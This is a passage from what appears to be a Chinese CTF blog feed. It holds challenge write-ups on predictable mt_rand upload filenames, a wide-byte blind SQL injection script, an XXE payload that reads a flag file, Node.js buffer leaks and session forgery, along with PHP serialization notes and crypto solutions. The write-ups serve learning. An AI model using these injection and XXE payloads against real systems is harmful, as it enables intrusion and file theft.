class="number">1</span>);</div><div class="line">        $str .= $set[$ch];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $str;</div><div class="line">&#125;</div><div class="line"></div><div class="line">session_start();</div><div class="line"></div><div class="line">$reg=<span class="string">'/gif|jpg|jpeg|png/'</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</div><div class="line"></div><div class="line">    $seed = rand(<span class="number">0</span>,<span class="number">999999999</span>);</div><div class="line">    mt_srand($seed);</div><div class="line">    $ss = mt_rand();</div><div class="line">    $hash = md5(session_id() . $ss);</div><div class="line">    setcookie(<span class="string">'SESSI0N'</span>, $hash, time() + <span class="number">3600</span>);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</div><div class="line">        show_error_message(<span class="string">"Upload ERROR. Return Code: "</span> . $_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"error"</span>]);</div><div class="line">    &#125;</div><div class="line">    $check1 = ((($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</div><div class="line">            || ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</div><div class="line">            || ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</div><div class="line">            || ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</div><div class="line">        &amp;&amp; ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>));</div><div class="line">    $check2=!preg_match($reg,pathinfo($_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>], PATHINFO_EXTENSION));</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">if</span> ($check2) show_error_message(<span class="string">"Nope!"</span>);</div><div class="line">    <span class="keyword">if</span> ($check1) &#123;</div><div class="line">        $filename = <span class="string">'./uP1O4Ds/'</span> . random_str() . <span class="string">'_'</span> . $_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>];</div><div class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'tmp_name'</span>], $filename)) &#123;</div><div class="line">            show_message(<span class="string">"Upload successfully. File type:"</span> . $_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>]);</div><div class="line">        &#125; <span class="keyword">else</span> show_error_message(<span class="string">"Something wrong with the upload..."</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        show_error_message(<span class="string">"only allow gif/jpeg/png files smaller than 200kb!"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>可以看到是对文件做了一个白名单限制，然后在原文件名前加了随机字符串，爆破是不可能爆破的，因为有32^61种可能，注意到<code>random_str</code>是通过下面<code>mt_rand()</code>进行随机数的生成<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$seed = <span class="keyword">rand</span>(<span class="number">0</span>,<span class="number">999999999</span>);</div><div class="line">    mt_srand($seed);</div><div class="line">    $ss = mt_rand();</div><div class="line">    $hash = md5(session_id() . $ss);</div><div class="line">    setcookie(<span class="string">'SESSI0N'</span>, $hash, <span class="keyword">time</span>() + <span class="number">3600</span>);</div></pre></td></tr></table></figure></p>
<p>我们通过使session为空，使得生成的md5为纯数字，将md5放到网上查询发现需要付费，那么就自己写一段代码爆破一下：<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> hashlib</div><div class="line">c = <span class="string">'90369fd9718fd781f4b61b8cc5a1c991'</span></div><div class="line">i=<span class="number">0</span></div><div class="line"><span class="keyword">while</span> (i&lt;<span class="number">999999999</span>):</div><div class="line">    a = str(i)</div><div class="line">    b = hashlib.md5(a)</div><div class="line">    d = str(b.hexdigest())</div><div class="line">    <span class="keyword">if</span> (d == c):</div><div class="line">        print a</div><div class="line">        print d</div><div class="line">        <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        i=i+1</div></pre></td></tr></table></figure></p>
<p>跑了二十分钟才跑出来为<code>664794591</code>，看write up说用到这样一个<a href="http://download.openwall.net/pub/projects/php_mt_seed/" target="_blank" rel="external">工具</a>一个c语言写的求seed的工具，刚开始不会用，原来在linux下可以直接gcc编译然后运行:<br><img src="http://p1.bqimg.com/567571/e63b285dd2955ad6.png" alt=""><br>然后直接用加密代码得到文件名<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">$set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,</div><div class="line">    <span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,</div><div class="line">    <span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,</div><div class="line">    <span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,</div><div class="line">    <span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>);</div><div class="line">$seed=<span class="number">451382085</span>;</div><div class="line">mt_srand($seed);</div><div class="line">$ss = mt_rand();</div><div class="line">$str=<span class="string">""</span>;</div><div class="line"><span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= <span class="number">32</span>; ++$i) &#123;</div><div class="line">    $ch = mt_rand(<span class="number">0</span>, count($set) - <span class="number">1</span>);</div><div class="line">    $str .= $set[$ch];</div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> $str;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>利用phar伪协议包含ZIP文件得到shell，由于最开始大意弄成了RAR发现phar只适合ZIP格式。</p>
<h2 id="Come-on"><a href="#Come-on" class="headerlink" title="Come on"></a>Come on</h2><p>拿到题目只知道是注入，一脸懵逼，看了write up才知道是宽字节布尔盲注过滤了<code>/*、*/、and、or、mid、substr、union、&gt;、&lt;、空白符、ascii</code>等敏感词，使用括号代替空格，使用left/right函数结合以代替substr()和mid()的方式进行注入，且此查询默认不区分大小写，需要使用binary()附上NSIS大佬的脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</div><div class="line">url = <span class="string">"http://218.2.197.235:23733/index.php?key="</span></div><div class="line">payload = <span class="string">"\xc0'||(select(binary(flag))from(flag))like(0x%s)#"</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(str)</span>:</span></div><div class="line">    u = url + quote(payload%(str.encode(<span class="string">"hex"</span>)))</div><div class="line">    ret = requests.get(u).content</div><div class="line">    <span class="keyword">return</span> <span class="string">'002265'</span> <span class="keyword">in</span> ret</div><div class="line">ans = <span class="string">""</span></div><div class="line">s = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\'"_%'</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">print</span> ans</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</div><div class="line">        <span class="keyword">if</span> check(ans + i + <span class="string">'%'</span>):</div><div class="line">            ans += i</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure></p>
<h2 id="Chall-I"><a href="#Chall-I" class="headerlink" title="Chall I"></a>Chall I</h2><p>查看源代码发现<code>&lt;!--a(href=&#39;/admin&#39;) admin--&gt;</code>打开/admin页面，要求输入密码而且会返回密码的md5值，到这就懵逼了，看了NeSE的write up才知道考的是一个node js的buffer漏洞。<br><figure class="highlight q"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">buffer漏洞本质上就是传入整数会导致内存泄露，由于对输入有一个<span class="built_in">md5</span>加密，那么就找个一个<span class="built_in">md5</span>加密之后是整数的值</div></pre></td></tr></table></figure></p>
<p>1518375就是一个md5后纯整数的值，提交之后出现内存泄露，多提交几次泄露出flag<br><img src="http://i1.piimg.com/567571/91e9a0546b90c52f.png" alt=""></p>
<h2 id="Chall-II"><a href="#Chall-II" class="headerlink" title="Chall II"></a>Chall II</h2><p>github有<a href="https://github.com/0lddriver/app" target="_blank" rel="external">源码</a>通过I的flag修改app的secret_key，然后以admin登录获取session与session.sign然后带着这两个Cookie去访问题目得到flag，国外的一个题目差不多原题<code>https://www.smrrd.de/nodejs-hacking-challenge-writeup.html</code><br><img src="http://i1.piimg.com/567571/b5e9fe58fac504d9.png" alt=""></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="konck"><a href="#konck" class="headerlink" title="konck"></a>konck</h2><figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="params">...</span>._<span class="params">...</span>.._.._<span class="params">...</span>._<span class="params">...</span>_<span class="params">...</span>.._<span class="params">...</span>._<span class="params">...</span>_<span class="params">...</span>_<span class="params">...</span>._<span class="params">...</span>._<span class="params">...</span><span class="params">...</span>._._<span class="params">...</span>._<span class="params">...</span>.._.._<span class="params">...</span>._<span class="params">...</span>_<span class="params">...</span>_<span class="params">...</span>._<span class="params">...</span>._<span class="params">...</span>_<span class="params">...</span>_<span class="params">...</span>._.._<span class="params">...</span>_<span class="params">...</span><span class="params">...</span>._<span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span></div><div class="line">zjqz hexjz mo oqrs sai daiyn lebn zjo vos ltah zjer horrqxo e iron lobdo za voou zjo vos qfqs ltah mqn qrr joto er zjo horrqxo ebooqydrztyqqojolx</div></pre></td></tr></table></figure>
<p>最开始一直以为上面的是摩斯密码，后来才知道是与下面的一一对照，是一个单表替换加栅栏解密利用<a href="http://quipqiup.com/" target="_blank" rel="external">quipqiup</a>解密得到<code>that might be easy you could find the key from this message i used fence to keep the key away from bad ass here is the message ineealcstrlaaehefg</code>,提示说flag就在后面的字母里面，栅栏一下得到<code>icanseetherealflag</code></p>
<h2 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy_crypto"></a>easy_crypto</h2><p>就是根据已有的加密代码跟明文与密文爆破出key然后得到key对flag.txt进行解密得到flag。<br>源程序：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"USAGE: %s input_file output_file\n"</span>, argv[<span class="number">0</span>]);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    FILE* input_file  = fopen(argv[<span class="number">1</span>], <span class="string">"rb"</span>);</div><div class="line">    FILE* output_file = fopen(argv[<span class="number">2</span>], <span class="string">"wb"</span>);</div><div class="line">    <span class="keyword">if</span> (!input_file || !output_file) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Error\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">char</span> key[] = <span class="string">"XXXXXXXXXXXX"</span>;</div><div class="line">    <span class="keyword">char</span> p, t, c = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span> ((p = fgetc(input_file)) != EOF) &#123;</div><div class="line">        c = ((key[i % <span class="built_in">strlen</span>(key)] ^ t) + (p-t) + i*i ) &amp; <span class="number">0xff</span>;</div><div class="line">        t = p;</div><div class="line">        i++;</div><div class="line">        fputc(c, output_file);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>爆破key：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="attr">flag=open('cipher.txt','rb')</span></div><div class="line"><span class="attr">cipher=open('plain.txt','rb')</span></div><div class="line"><span class="attr">cipher_=cipher.read()</span></div><div class="line"><span class="attr">flag_=flag.read()</span></div><div class="line"><span class="attr">p=0</span></div><div class="line"><span class="attr">t=0</span></div><div class="line"><span class="attr">x=[]</span></div><div class="line"><span class="attr">z=''</span></div><div class="line">for i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag_)):</div><div class="line">	<span class="attr">p=ord(cipher_[i])</span></div><div class="line">	<span class="attr">c=(ord(flag_[i])-(p-t)-i*i)&amp;0xff^t</span></div><div class="line">	<span class="attr">t=p</span></div><div class="line">	<span class="attr">z=z+chr(c)</span></div><div class="line">print z</div></pre></td></tr></table></figure></p>
<p>解密flag：<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">g=<span class="keyword">open</span>(<span class="string">'flag.txt'</span>,<span class="string">'rb'</span>).read()</div><div class="line">key=<span class="string">'OKIWILLLETYOUKNOWWHATTHEKEYIS'</span></div><div class="line">c = <span class="string">''</span></div><div class="line">t = <span class="keyword">chr</span>(<span class="number">0</span>)</div><div class="line">i = <span class="number">0</span></div><div class="line"><span class="keyword">x</span>=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> p in g:</div><div class="line">    c = <span class="keyword">chr</span>(<span class="keyword">ord</span>(p)+<span class="keyword">ord</span>(t) - i*i - (<span class="keyword">ord</span>(key[i % len(key)]) ^ <span class="keyword">ord</span>(t)) &amp; <span class="number">0xff</span>)</div><div class="line">    t = c</div><div class="line">    i += <span class="number">1</span></div><div class="line">    <span class="keyword">x</span>+=c</div><div class="line"><span class="keyword">print</span> <span class="keyword">x</span></div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Write-up </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Jarvis OJ api调用]]></title>
      <url>http://isron.cn/2017/03/13/Jarvis-OJ_api/</url>
      <content type="html"><![CDATA[<p>查看源码后获得一串JS代码<a id="more"></a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span>&#123;</div><div class="line"> evil_input = <span class="built_in">document</span>.getElementById(<span class="string">"evil-input"</span>).value;</div><div class="line"> <span class="keyword">var</span> xhr = XHR();</div><div class="line">     xhr.open(<span class="string">"post"</span>,<span class="string">"/api/v1.0/try"</span>,<span class="literal">true</span>);</div><div class="line">     xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">         <span class="keyword">if</span> (xhr.readyState==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">201</span>) &#123;</div><div class="line">             data = <span class="built_in">JSON</span>.parse(xhr.responseText);</div><div class="line">             tip_area = <span class="built_in">document</span>.getElementById(<span class="string">"tip-area"</span>);</div><div class="line">             tip_area.value = data.task.search+data.task.value;</div><div class="line">         &#125;</div><div class="line">     &#125;;</div><div class="line">     xhr.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</div><div class="line">     xhr.send(<span class="string">'&#123;"search":"'</span>+evil_input+<span class="string">'","value":"own"&#125;'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>由于JS学的贼辣鸡，读半天没读懂，看了下Response包发现<br><img src="http://i1.piimg.com/567571/0a496a1df9ab24d7.png" alt=""><br>服务器是用python搭建的还有就是Content-Type很重要<a href="https://www.leavesongs.com/PENETRATION/slim3-xxe.html" target="_blank" rel="external">php框架slim架构上存在XXE漏洞</a>P牛之前的一篇文章主要就利用修改content—type内容进行XXE漏洞，将<code>Content-Type: application/json</code>修改为<code>Content-Type: application/xml</code>利用别人的payload读取/home/ctf/flag.txt文件的内容得到flag<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE try[&lt;!ENTITY xxe SYSTEM "file:///home/ctf/flag.txt"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">search</span>&gt;</span>type sth!<span class="tag">&lt;/<span class="name">search</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>第一次接触js代码跟XXE漏洞，之后好好研究研究</p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[简单的Python爬虫]]></title>
      <url>http://isron.cn/2017/03/05/python_s/</url>
      <content type="html"><![CDATA[<p>Requests 是用Python语言编写，基于 urllib，采用 Apache2 Licensed 开源协议的 HTTP 库.<br><a id="more"></a><br>利用python的requests库进行请求是非常方便的一件事情详情可以<a href="http://docs.python-requests.org/zh_CN/latest/user/quickstart.html" title="Requests库手册" target="_blank" rel="external">戳这里</a>查看Requests手册</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">pic_url = []  <span class="comment"># 创建一个列表用于存储图片的URL</span></div><div class="line"><span class="keyword">for</span> q <span class="keyword">in</span> range( <span class="number">84</span>, <span class="number">93</span> ):  <span class="comment"># 一个URL一张大图，多次访问</span></div><div class="line">    url = <span class="string">"http://desk.zol.com.cn/bizhi/6849_854"</span> + str( q ) + <span class="string">"_2.html"</span></div><div class="line">    head = &#123;</div><div class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36'</span>&#125;</div><div class="line">    ss = requests.get( url, headers=head )  <span class="comment"># GET方式请求访问</span></div><div class="line">    s = re.findall( <span class="string">'&lt;img id="bigImg" src="(.*?)"'</span>, ss.content )  <span class="comment"># 通过正则表达式匹配图片URL</span></div><div class="line">    s = s[<span class="number">0</span>]</div><div class="line">    pic_url.append( s )</div><div class="line"><span class="keyword">print</span> pic_url</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    os.mkdir( <span class="string">"your_name"</span> )  <span class="comment">#创建一个文件夹</span></div><div class="line">    os.chdir( <span class="string">"your_name"</span> )  <span class="comment">#将工作目录转移到创建的文件夹当中</span></div><div class="line"><span class="keyword">except</span>:</div><div class="line">    os.chdir( <span class="string">"your_name"</span> )</div><div class="line"><span class="keyword">for</span> each <span class="keyword">in</span> pic_url:  <span class="comment">#for循环访问URL</span></div><div class="line">    b = random.randint( <span class="number">1</span>, <span class="number">999999</span> )  <span class="comment">#随机数命名图片</span></div><div class="line">    b = str( b )</div><div class="line">    <span class="keyword">if</span> <span class="string">'http'</span> <span class="keyword">in</span> each:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">print</span> each</div><div class="line">    pic = requests.get( each )</div><div class="line">    fp = open( b + <span class="string">'.jpg'</span>, <span class="string">'wb'</span> ) <span class="comment">#创建图片文件</span></div><div class="line">    fp.write( pic.content )  <span class="comment">#写入数据</span></div><div class="line"><span class="keyword">print</span> <span class="string">"OK"</span></div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP序列化与反序列化]]></title>
      <url>http://isron.cn/2017/03/03/php_unserialize/</url>
      <content type="html"><![CDATA[<p>序列化是将变量转换为可保存或传输的字符串的过程;反序列化就是在适当的时候把这个字符串再转化成原来的变量使用<br><a id="more"></a><br>主要由serialize与unserialize实现</p>
<pre><code>serialize：产生一个可存储的值的表示，也就是将变量转换为可保存或可传输的字符串
unserialize：在适当的时候将字符串转化为原来的变量
</code></pre><p>PHP序列化键名对照表:</p>
<table>
<thead>
<tr>
<th>相应的变量</th>
<th>键值</th>
</tr>
</thead>
<tbody>
<tr>
<td>数组的二次赋值(&amp;)</td>
<td>R</td>
</tr>
<tr>
<td>对象的二次赋值</td>
<td>r</td>
</tr>
<tr>
<td>Null</td>
<td>N</td>
</tr>
<tr>
<td>Ture</td>
<td>b:1</td>
</tr>
<tr>
<td>False</td>
<td>b:0</td>
</tr>
<tr>
<td>Long</td>
<td>i</td>
</tr>
<tr>
<td>Double</td>
<td>d</td>
</tr>
<tr>
<td>String</td>
<td>s/S</td>
</tr>
<tr>
<td>Class</td>
<td>C</td>
</tr>
<tr>
<td>Array</td>
<td>a</td>
</tr>
<tr>
<td>Object</td>
<td>o</td>
</tr>
<tr>
<td>public</td>
<td>key</td>
</tr>
<tr>
<td>protected</td>
<td>\0*\0key</td>
</tr>
<tr>
<td>private</td>
<td>\0key\0</td>
</tr>
</tbody>
</table>
<p>举个栗子：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</div><div class="line">        <span class="keyword">public</span> $file;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</div><div class="line">            <span class="keyword">$this</span> -&gt; file = $filename;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $shield = <span class="keyword">new</span> Shield(<span class="string">'pctf.php'</span>);</div><div class="line">    <span class="keyword">echo</span> serialize($shield);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>生成<code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code>序列化之前应该是一个shield对象中file=pctf.php，通过序列化生成一串字符串，便于传输和保存</p>
]]></content>
      
        <categories>
            
            <category> 代码审计 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP序列化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Jarvis OJ 神盾局的秘密]]></title>
      <url>http://isron.cn/2017/03/01/Jarvis-OJ_shield/</url>
      <content type="html"><![CDATA[<p>这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？<br><a id="more"></a><br>打开题目发现是一张图片，通过查看源代码得到<code>&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;</code>打开后发现应该是图片的十六进制编码并且img后面是base64编码过的，解码为<code>shield.jpg</code>应该是一个文件包含漏洞试下showimg.php得到<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">	$f = $_GET[<span class="string">'img'</span>];</div><div class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</div><div class="line">		$f = base64_decode($f);</div><div class="line">		<span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span></div><div class="line">		&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</div><div class="line">			readfile($f);</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			<span class="keyword">echo</span> <span class="string">"File not 